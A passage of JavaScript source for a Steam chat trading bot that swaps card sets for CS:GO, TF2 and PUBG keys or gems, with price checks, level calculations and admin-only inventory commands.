					handleInventoryErrors(err, source);
				} else {
					let requested_sets=parseInt((keys/keyBuyPrice)*keyBuySets);
					if(customer_sets.length > 0){
						if(customer_sets.length >= requested_sets){
							customer.Message(source, msg.SendingOffer);
							inventory.getToOfferSets(customer_sets, requested_sets, toRequest => {
								inventory.getToOffer_CS_Keys(keys, toSend => {
									makeOffer(source, toSend, [].concat.apply([], toRequest), `${requested_sets}:${keys}`, 1, "key(s)");
								});
							});
						} else {
							customer.Message(source, msg.them_need.replace("{currency_qty}", +customer_sets.length).replace("{currency}", "sets").replace("{needed}", requested_sets));
						}
					} else {
						customer.Message(source, msg.ThemDonthave);
					}
				}
			});
		} else {
			customer.Message(source, msg.i_need.replace("{currency_qty}", inventory.haveCsKeys()).replace("{currency}", "cs:go keys").replace("{needed}", keys));
		}
	} else {
		customer.Message(source, msg.Sorryme2.replace("{currency_name}", "cs:go keys"))
	}
}

function sellgems(source, sets){
	let GemsQty = inventory.return_GemsQty();
	if(GemsQty){
		let need = GemBuyPrice*sets;
		if(GemsQty >= need){
			customer.Message(source, msg.CustomerRequest);
			inventory.getCustomerSets(false, source, (err, customer_sets) => {
				if(err){
					handleInventoryErrors(err, source);
				} else {
					if(customer_sets.length > 0){
						if(customer_sets.length >= sets){
							customer.Message(source, msg.SendingOffer);
							inventory.getToOfferSets(customer_sets, sets, toRequest => {
								inventory.getGems(need, toSend => {
									makeOffer(source, toSend, [].concat.apply([], toRequest), `${sets}:${need}`, 1, "gems");
								});
							});
						} else {
							customer.Message(source, msg.them_need.replace("{currency_qty}", +customer_sets.length).replace("{currency}", "sets").replace("{needed}", sets));
						}
					} else {
						customer.Message(source, msg.ThemDonthave);
					}
				}
			});
		} else {
			customer.Message(source, msg.i_need.replace("{currency_qty}", GemsQty).replace("{currency}", "gems").replace("{needed}", need));
		}
	} else {
		customer.Message(source, msg.Sorryme2.replace("{currency_name}", "gems"))
	}
}

function selltf(source, keys){
	if(inventory.haveTfKeys()){
		if(inventory.haveTfKeys() >= keys){
			customer.Message(source, msg.CustomerRequest);
			inventory.getCustomerSets(false, source, (err, customer_sets) => {
				if(err){
					handleInventoryErrors(err, source);
				} else {
					let requested_sets=parseInt((keys/tfkeyBuyPrice)*tfkeyBuySets);
					if(customer_sets.length > 0){
						if(customer_sets.length >= requested_sets){
							customer.Message(source, msg.SendingOffer);
							inventory.getToOfferSets(customer_sets, requested_sets, toRequest => {
								inventory.getToOffer_TF_Keys(keys, toSend => {
									makeOffer(source, toSend, [].concat.apply([], toRequest), `${requested_sets}:${keys}`, 1, "tf key(s)");
								});
							});
						} else {
							customer.Message(source, msg.them_need.replace("{currency_qty}", +customer_sets.length).replace("{currency}", "sets").replace("{needed}", requested_sets));
						}
					} else {
						customer.Message(source, msg.ThemDonthave);
					}
				}
			});
		} else {
			customer.Message(source, msg.i_need.replace("{currency_qty}", inventory.haveTfKeys()).replace("{currency}", "tf keys").replace("{needed}", keys));
		}
	} else {
		customer.Message(source, msg.Sorryme2.replace("{currency_name}", "tf keys"))
	}
}

function sellpubg(source, keys){
	if(inventory.havePubgKeys()){
		if(inventory.havePubgKeys() >= keys){
			customer.Message(source, msg.CustomerRequest);
			inventory.getCustomerSets(false, source, (err, customer_sets) => {
				if(err){
					handleInventoryErrors(err, source);
				} else {
					let requested_sets=parseInt((keys/pubgkeyBuyPrice)*pubgkeyBuySets);
					if(customer_sets.length > 0){
						if(customer_sets.length >= requested_sets){
							customer.Message(source, msg.SendingOffer);
							inventory.getToOfferSets(customer_sets, requested_sets, toRequest => {
								inventory.getToOffer_PUBG_Keys(keys, toSend => {
									makeOffer(source, toSend, [].concat.apply([], toRequest), `${requested_sets}:${keys}`, 1, "pubg key(s)");
								});
							});
						} else {
							customer.Message(source, msg.them_need.replace("{currency_qty}", +customer_sets.length).replace("{currency}", "sets").replace("{needed}", requested_sets));
						}
					} else {
						customer.Message(source, msg.ThemDonthave);
					}
				}
			});
		} else {
			customer.Message(source, msg.i_need.replace("{currency_qty}", inventory.haveTfKeys()).replace("{currency}", "pubg keys").replace("{needed}", keys));
		}
	} else {
		customer.Message(source, msg.Sorryme2.replace("{currency_name}", "pubg keys"))
	}
}

function sellcheck(source){
	customer.Message(source, msg.CustomerRequest);
	inventory.getCustomerSets(false, source, (err, customer_sets) => {
		if(err){
			handleInventoryErrors(err, source);
		} else {
			let cansell=customer_sets.length;
			if(cansell > 0){
				let response = msg.SellCheck.replace("{amount}", cansell);
				response +=  B+msg.SellCheck2.replace("{csgokeys_amount}", parseInt((cansell/keyBuySets)*keyBuyPrice)).replace("{csgosets_amount}", (keyBuySets/keyBuyPrice)*parseInt((cansell/keyBuySets)*keyBuyPrice)).replace("{gems_amount}", helper.nFormat((cansell/GemBuySet)*GemBuyPrice)).replace("{gemsets_amount}", cansell);
				if(inventory.enableTF){
					response += msg.SellCheck3.replace("{tfkeys_amount}", parseInt((cansell/tfkeyBuySets)*tfkeyBuyPrice)).replace("{tfsets_amount}", (tfkeyBuySets/tfkeyBuyPrice)*parseInt((cansell/tfkeyBuySets)*tfkeyBuyPrice));
				}
				if(inventory.enablePUBG){
					response += msg.SellCheck4.replace("{pubgkeys_amount}", parseInt((cansell/pubgkeyBuySets)*pubgkeyBuyPrice)).replace("{pubgsets_amount}", (pubgkeyBuySets/pubgkeyBuyPrice)*parseInt((cansell/pubgkeyBuySets)*pubgkeyBuyPrice));
				}
				response += B+msg.SellCheck_i.replace("{sell_qty}", parseInt((cansell/keyBuySets)*keyBuyPrice)).replace("{sellgems_qty}", cansell);
				if(inventory.enableTF){ response+= msg.SellCheck_i2.replace("{selltf_qty}", parseInt((cansell/tfkeyBuySets)*tfkeyBuyPrice));}
				if(inventory.enablePUBG){ response+= msg.SellCheck_i3.replace("{sellpubg_qty}", parseInt((cansell/pubgkeyBuySets)*pubgkeyBuyPrice));}
				customer.Message(source, response);
			} else {
				customer.Message(source, msg.ThemDonthave);
			}
		}
	});
}

function block(admin, target){
	if(config.admin.indexOf(target) > -1){
		customer.Message(admin, 'You can\'t block this user!');
	} else {
		client.blockUser(target, result => {
			if(result == 1){
				customer.Message(admin, `Successfully blocked user ${target} !`);
			} else {
				customer.Message(admin, 'Fail!, did you put the right SteamID64 ??');
			}
		});
	}
}

function unblock(admin, target){
	if(config.admin.indexOf(target) > -1){
		customer.Message(admin, B+'You can\'t unblock this user!');
	} else {
		client.unblockUser(target, result => {
			if(result == 1){
				customer.Message(admin, `Successfully unblocked user ${target} !`);
			} else {
				customer.Message(admin, 'Fail!, did you put the right SteamID64 ??');
			}
		});
	}
}

function stats(admin){
	let response = `I currently have ${helper.nFormat(inventory.haveSets())} sets, ${inventory.haveCsKeys()} CS:GO keys, ${helper.nFormat(inventory.return_GemsQty())} Gems`;
	if(inventory.enableTF){response += `, ${inventory.haveTfKeys()} Tf keys`;}
	if(inventory.enablePUBG){response += `, ${inventory.havePubgKeys()} Pubg keys`;}
	response += " on my inventory.";
	customer.Message(admin, response);
}

function _profit(admin){
	let response = `I have sold ${helper.nFormat(profit.sell.csgo.sets)} sets for ${helper.nFormat(profit.sell.csgo.currency)} CS:GO keys, ${helper.nFormat(profit.sell.gems.sets)} sets for ${helper.nFormat(profit.sell.gems.currency)} Gems`;
	if(inventory.enableTF){response += `, ${helper.nFormat(profit.sell.tf.sets)} sets for ${helper.nFormat(profit.sell.tf.currency)} Tf keys`;}
	if(inventory.enablePUBG){response += `, ${helper.nFormat(profit.sell.pubg.sets)} sets for ${helper.nFormat(profit.sell.pubg.currency)} Pubg keys`;}
	response += `${B}I have buyed ${helper.nFormat(profit.buy.csgo.sets)} sets for ${helper.nFormat(profit.buy.csgo.currency)} CS:GO keys, ${helper.nFormat(profit.buy.gems.sets)} sets for ${helper.nFormat(profit.buy.gems.currency)} Gems`;
	if(inventory.enableTF){response += `, ${helper.nFormat(profit.buy.tf.sets)} sets for ${helper.nFormat(profit.buy.tf.currency)} Tf keys`;}
	if(inventory.enablePUBG){response += `, ${helper.nFormat(profit.buy.pubg.sets)} sets for ${helper.nFormat(profit.buy.pubg.currency)} Pubg keys`;}
	customer.Message(admin, response);
}

function stock(admin){
	customer.Message(admin, msg.OwnerRequest);
	inventory.getCustomerSets(true, admin, (err, sets) => {
		if(err){
			handleInventoryErrors(err, admin);
		} else {
			if(sets.length){
				customer.Message(admin, `I've found ${sets.length} sets!, i'll send the trade offer now xD`);
				makeOffer(admin, [], [].concat.apply([], sets), 'admin');
			} else {
				customer.Message(admin, msg.ThemDonthave);
			}
		}
	});
}

function level(source, qty){
	customer.Message(source, msg.CustomerRequest);
	inventory.getUserBadges(source, 0, 0, (err, badge, player_level, player_xp) => {
		if(err){
			handleBadgeErrors(err, source);
		} else {
			if(qty < player_level){
				customer.Message(source, `You've already reached level ${qty}!!`);
			} else {
				let needed=Math.ceil( ((helper.getLevelExp(parseInt(qty)))-player_xp)/100 ),
					response = msg.Level.replace("{needed}", needed).replace("{desired_level}", qty);
				response += B+msg.Level_c.replace("{price_keys}", ((needed/keySets)*keyPrice).toFixed(1)).replace("{price_gems}", helper.nFormat((needed/GemSet)*GemPrice));
				if(inventory.enableTF){response += msg.Level_c2.replace("{price_tf}", ((needed/tfkeySets)*tfkeyPrice).toFixed(1));}
				if(inventory.enablePUBG){response += msg.Level_c3.replace("{price_pubg}", ((needed/pubgkeySets)*pubgkeyPrice).toFixed(1));}
				response += B+msg.Level2;
				customer.Message(source, response);
			}
		}
	});
}

function restart_(){
	helper.log('Restarting..');
	if(!client.steamID){
		tryLogin();
	} else {
		client.relog();
	}
}
function shutdown() {
	helper.log('Shutdown requested, bye..');
	try {
		client.logOff();
		client.once('disconnected', () => { process.exit(1); });
	} catch(e) {
		process.exit(1);
	}
	setTimeout(() => { process.exit(1); }, 1500);
}

client.on('friendMessage', (source, message) => {
	helper.storeChatLogData(source, message);

	if(customer.LastInteract[source] && Math.floor(helper.Now() - customer.LastInteract[source]) < 500){
		if(!customer.Warns[source]){ customer.Warns[source] = 0; }
		customer.Warns[source]++;
		if(customer.Warns[source] == 1){ customer.Message(source, msg.SpamWarn1); }
		if(customer.Warns[source] == 2){ customer.Message(source, msg.SpamWarn2); }
		if(customer.Warns[source] > 5){ client.blockUser(source); }
		else if(customer.Warns[source] > 2){
			customer.Message(source, msg.SpamWarn3);
			customer.sendAdminMessages(`User #${source} has sending to much messages and have been removed from bot friendlist!`);
			helper.warn(`User #${source} has sending to much messages and have been removed from bot friendlist!`);
			client.removeFriend(source);
		}
		return;
	}

	customer.UserInteract(source, 0);

	let m = message.toLowerCase();

	if(inventory.loading){
		if(m.indexOf('!buy') > -1 || m.indexOf('!sell') > -1 || m.indexOf('!gemswithdraw') > -1 || m.indexOf('!withdraw') > -1 || m.indexOf('!deposit') > -1 | m.indexOf('!tfdeposit') > -1 | m.indexOf('!tfwithdraw') > -1){
			customer.Message(source, msg.Loading);
			return;
		}
	}

	if(m == "!help" || m == "!commands"){
		let response = 'Commands:';
		response += B+'!owner - show my owner profile, if you have any problems you may contact me!';
		response += B+'!stats - show current bot amount of currencies';
		response += B+'!prices to see our prices';
		response += B;
		response += B+'!level [your dream level] - calculate how many sets and how many keys it\'ll cost to desired level';
		response += B+'!check - show how many sets the bot have available and how much you can craft';
		response += B+'!check [amount] - show how many sets and which level you would reach for a specific amount of keys';
		if(inventory.enableTF){response += B+'!checktf [amount] - show how many sets and which level you would reach for a specific amount of keys';}
		if(inventory.enablePUBG){response += B+'!checkpubg [amount] - show how many sets and which level you would reach for a specific amount of keys';}
		response += B+'!checkgems [amount] - show how many sets and which level you would reach for a specific amount of gems';
		response += B;
		response += B+'!buy [amount of CS:GO keys] - use to buy that amount of CS:GO keys for sets you dont have, following the current BOT rate';
		if(inventory.enableTF){response += B+'!buytf [amount of Tf keys] - use to buy that amount of TF2 keys for sets you dont have, following the current BOT rate';}
		if(inventory.enablePUBG){response += B+'!buypubg [amount of Pubg keys] - use to buy that amount of PUBG keys for sets you dont have, following the current BOT rate';}
		response += B+'!buygems [amount of sets] - use to buy that amount of sets for gems, following the current BOT rate';
		response += B+'!buyany [amount of CS:GO keys] - use to buy that amount of CS:GO keys for any sets, following the current BOT rate';
		response += B;
		response += B+'!buyone [amount of CS:GO keys] - use this if you are a badge collector. BOT will send only one set of each game, following the current BOT rate';
		if(inventory.enableTF){response += B+'!buyonetf [amount of Tf keys] - use this if you are a badge collector. BOT will send only one set of each game, following the current BOT rate';}
		if(inventory.enablePUBG){response += B+'!buyonepubg [amount of Pubg keys] - use this if you are a badge collector. BOT will send only one set of each game, following the current BOT rate';}
		response += B+'!buyonegems [amount of sets] - use this if you are a badge collector. sames as !buyone, buy you pay with gems!';
		response += B;
		if(config.enableSell){response += B+'!sell [amount of CS:GO keys] - sell your sets for CS:GO Key(s)';}
		if(config.enableSell){response += B+'!sellgems [amount of sets] - sell your sets for gems';}
		if(inventory.enableTF && config.enableSell){response += B+'!selltf [amount of Tf keys] - sell your sets for Tf Key(s)';}
		if(inventory.enablePUBG && config.enableSell){response += B+'!sellpubg [amount of Pubg keys] - sell your sets for Pubg Key(s)';}
		if(config.enableSell){ response +=B+'!sellcheck - show information about the set(s) you can sell'; }
		customer.Message(source, response);
	}

	else if(m.indexOf("!checktf") > -1  && inventory.enableTF){
		parseInputs(message, source, 1, inputs => {
			if(inputs){
				checkam(source, inputs, 0, (lvl, desired) => {
					if(lvl != level){
						customer.Message(source, `With ${inputs} tf key(s) you'll get ${parseInt(inputs/tfkeyPrice)*tfkeySets} set(s) and reach level ${desired}, interested? try !buytf ${parseInt( inputs/tfkeyPrice )}`);
					} else {
						customer.Message(source, `With ${inputs} tf key(s) you'll get ${parseInt(inputs/tfkeyPrice)*tfkeySets} set(s) but still on level ${lvl}, interested? try !buytf ${parseInt(inputs/tfkeyPrice)}`);
					}
				});
			}
		}, config.maxTradeKeys);
	}

	else if(m.indexOf("!checkpubg") > -1  && inventory.enablePUBG){
		parseInputs(message, source, 1, inputs => {
			if(inputs){
				checkam(source, inputs, 0, (lvl, desired) => {
					if(lvl != level){
						customer.Message(source, `With ${inputs} pubg key(s) you'll get ${parseInt(inputs/pubgkeyPrice)*pubgkeySets} set(s) and reach level ${desired}, interested? try !buypubg ${parseInt( inputs/pubgkeyPrice )}`);
					} else {
						customer.Message(source, `With ${inputs} pubg key(s) you'll get ${parseInt(inputs/pubgkeyPrice)*pubgkeySets} set(s) but still on level ${lvl}, interested? try !buypubg ${parseInt(inputs/pubgkeyPrice)}`);
					}
				});
			}
		}, config.maxTradeKeys);
	}

	else if(m.indexOf("!checkgems") > -1){
		parseInputs(message, source, GemPrice, inputs => {
			if(inputs){
				checkgam(source, inputs, (lvl, desired) => {
					if(lvl != desired){
						customer.Message(source, `With ${inputs} gems you'll get ${parseInt(inputs/GemPrice)*GemSet} set(s), interested? try !buygems ${parseInt(inputs/GemPrice)}`);
					} else {
						customer.Message(source, `With ${inputs} gems you'll get ${parseInt(inputs/GemPrice)*GemSet} set(s) but'll stay on level ${lvl}, interested? try !buygems ${parseInt(inputs/GemPrice)}`);
					}
				});
			}
		}, config.maxTradeKeys*keySets*GemPrice );
	}

	else if(m.indexOf("!check") > -1){
		if(m.split(" ")[1]){
			parseInputs(message, source, 1, inputs => {
				if(inputs){
					checkam(source, inputs, 1, (lvl, desired) => {
						if(lvl != level){
							customer.Message(source, `With ${inputs} key(s) you'll get ${parseInt(inputs/keyPrice)*keySets} set(s) and reach level ${desired}, interested? try !buy ${parseInt(inputs/keyPrice)}`);
						} else {
							customer.Message(source, `With ${inputs} key(s) you'll get ${parseInt(inputs/keyPrice)*keySets} set(s) but'll stay on level ${lvl}, interested? try !buy ${parseInt(inputs/keyPrice)}`);
						}
					});
				}
			}, config.maxTradeKeys);
		} else { check(source); }
	}

	else if (m == '!prices' || m == '!price' || m == '!rate' || m == '!rates' ) {
		let response = 'The currently prices are:';
		response += `${B}${keySets} sets for ${keyPrice} CS:GO Key(s)`;
		if(inventory.enableTF){response += `${B}${tfkeySets} set(s) for ${tfkeyPrice} Tf Key(s)`;}
		if(inventory.enablePUBG){response += `${B}${pubgkeySets} set(s) for ${pubgkeyPrice} Pubg Key(s)`;}
		response += `${B}${GemPrice} Gems for ${GemSet} set(s)`;
		response += B;
		response += B+'Also, we\'re buying '+keyBuySets+' sets for '+keyBuyPrice+' CS:GO Key(s)';
		if(inventory.enableTF){response += `${B}${tfkeyBuySets} sets for ${tfkeyBuyPrice} Tf Key(s)`;}
		if(inventory.enablePUBG){response += `${B}${pubgkeyBuySets} sets for ${pubgkeyBuyPrice} Pubg Key(s)`;}
		response += `${B}${GemBuySet} sets for ${GemBuyPrice} Gems`;
		response += B;
		response += `${B}Type !help for more information!`;
		customer.Message(source, response);
	}


	else if(m.indexOf('!level') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ level(source, inputs); } }, config.maxLevelComm); }
	else if(m.indexOf('!buygems') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ buygems(source, inputs, 1, 5); } }, config.maxTradeKeys*keySets); }
	else if(m.indexOf('!buyonetf') > -1  && inventory.enableTF){ parseInputs(message, source, 1, inputs => { if(inputs){ buytf(source, inputs, 1, 1); } }, config.maxTradeKeys); }
	else if(m.indexOf('!buyonepubg') > -1  && inventory.enablePUBG){ parseInputs(message, source, 1, inputs => { if(inputs){ buypubg(source, inputs, 1, 1); } }, config.maxTradeKeys); }
	else if(m.indexOf('!buyonegems') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ buygems(source, inputs, 1, 1); } }, config.maxTradeKeys*keySets); }
	else if(m.indexOf('!buyone') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ buy(source, inputs, 1, 1); } }, config.maxTradeKeys); }
	else if(m.indexOf('!buytf') > -1  && inventory.enableTF){ parseInputs(message, source, 1, inputs => { if(inputs){ buytf(source, inputs, 1, 5); } }, config.maxTradeKeys); }
	else if(m.indexOf('!buypubg') > -1  && inventory.enablePUBG){ parseInputs(message, source, 1, inputs => { if(inputs){ buypubg(source, inputs, 1, 5); } }, config.maxTradeKeys); }
	else if(m.indexOf('!buyany') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ buy(source, inputs, 0, 5); } }, config.maxTradeKeys); }
	else if(m.indexOf('!buy') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ buy(source, inputs, 1, 5); } }, config.maxTradeKeys); }
	else if(m.indexOf('!sellcheck') > -1 && config.enableSell){ sellcheck(source); }
	else if(m.indexOf('!selltf') > -1  && inventory.enableTF && config.enableSell){ parseInputs(message, source, 1, inputs => { if(inputs){ selltf(source, inputs); } }, config.maxTradeKeys); }
	else if(m.indexOf('!sellpubg') > -1  && inventory.enablePUBG && config.enableSell){ parseInputs(message, source, 1, inputs => { if(inputs){ selltf(source, inputs); } }, config.maxTradeKeys); }
	else if(m.indexOf('!sellgems') > -1 && config.enableSell){ parseInputs(message, source, 1, inputs => { if(inputs){ sellgems(source, inputs); } }, config.maxTradeKeys*keyBuySets); }
	else if(m.indexOf('!sell') > -1 && config.enableSell){ parseInputs(message, source, 1, inputs => { if(inputs){ sell(source, inputs); } }, config.maxTradeKeys); }

	else if (m == '!owner') {
		let response = "There is something wrong?";
		response += B+"Let me know if you're experiencing issues with my bot!";
		config.admin.forEach( target => { response += `${B}https://steamcommunity.com/profiles/${target}`; });
		customer.Message(source, response);
	}

	else if (m == '!dev' || m == '!proof' || m == '!developer') { customer.Message(source, `This bot was developed by Hight-Gain ${B} - Please don't buy from another person.`);}
	else if(m == '!stats'){ stats(source); }

	else if(config.admin.indexOf(source.getSteamID64()) > -1){
		if (m == '!admin') {
			let response = 'Admin Commands:';
			response += B+'!withdraw [amount] - withdraw x CS:GO keys';
			if(inventory.enableTF){response += B+'!tfwithdraw [amount] - withdraw x Tf keys';}
			response += B+'!gemswithdraw [amount] - withdraw x Gems';
			response += B;
			response += B+'!deposit [amount] - deposit x CS:GO keys';
			if(inventory.enableTF){response += B+'!tfdeposit [amount] - deposit x Tf keys';}
			response += B+'!depositgems [amount] - deposit x Gems';
			response += B;
			response += B+'!block [SteamID64] - block user';
			response += B+'!unblock [SteamID64] - unblock user';
			response += B;
			response += B+'!stock - bot will send a trade offer requesting all your available sets to trade';
			response += B+'!profit - show bot sells';
			response += B;
			response += B+'!restart - restart the bot(logoff and login)';
			response += B+'!shutdown - logoff bot and close application';
			customer.Message(source, response);
		}

		else if(m == '!profit'){ _profit(source); }
		else if(m == '!stock'){ stock(source); }
		else if(m.indexOf('!gemswithdraw') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ gemswithdraw(source, inputs); } }); }
		else if(m.indexOf('!tfwithdraw') > -1  && inventory.enableTF){ parseInputs(message, source, 1, inputs => { if(inputs){ tfwithdraw(source, inputs); } }); }
		else if(m.indexOf('!withdraw') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ withdraw(source, inputs); } }); }
		else if(m.indexOf('!tfdeposit') > -1  && inventory.enableTF){ parseInputs(message, source, 1, inputs => { if(inputs){ tfdeposit(source, inputs); } }); }
		else if(m.indexOf('!depositgems') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ depositgems(source, inputs); } }); }
		else if(m.indexOf('!deposit') > -1){ parseInputs(message, source, 1, inputs => { if(inputs){ deposit(source, inputs); } }); }
		else if(m.indexOf('!block') > -1){ isId64(message, source, sid => { if(sid){block(source, sid);} }); }
		else if(m.indexOf('!unblock') > -1){ isId64(message, source, sid => { if(sid){unblock(source, sid);} }); }

		else if(m == '!restart'){ customer.Message(source, "I'll be back in a minute!"); restart_(); }
		else if(m == '!shutdown'){ customer.Message(source, "I going down :("); shutdown(); }

		else { customer.Message(source, msg.UnknowAdmin); }
	}

	else { customer.Message(source, msg.Unknow); }
});

client.on('friendRelationship', (steamid, relationship) => { if (relationship === 2) { addFriend(steamid); } });

function isId64(message, target, callback){ const sid=message.split(" ")[1]; if(/[0-9]{17}/.test(sid)){ callback(sid); } else { customer.Message(target, `Try ${message.split(" ")[0]} [SteamId64]`); callback(0); } }

function parseInputs(message, target, min, callback, max){
	const
		qty=parseInt(message.split(" ")[1]),
		isNumber=!(isNaN(qty));
	if(isNumber){
		if(!(qty >= min)){ customer.Message(target, `The amount value should be ${min} or higher.`); callback(0); }
		else { if(max && qty > max){ customer.Message(target, `The amount value should be ${max} or lower`); callback(0); } else { callback(qty); } }
	}
	else { customer.Message(target, `Try ${message.split(" ")[0]} [amount]`); callback(0); }
}

function handleInventoryErrors(err, target){
	if(err.message.indexOf("profile is private") > -1){
		customer.Message(target, msg.Inventory_priv);
	} else {
		helper.logError(err.message, 'Inventory');
		customer.Message(target, msg.Inventory_error);
	}
}

function handleBadgeErrors(err, source){
	if(err.message == 'empty'){
		customer.Message(source, "I can't look at your badges if your profile is private, can you make it public for me? ty ^^");
	} else {
		helper.logError(err.message, 'Badge');
		customer.Message(source, msg.Badge_error);
	}
}
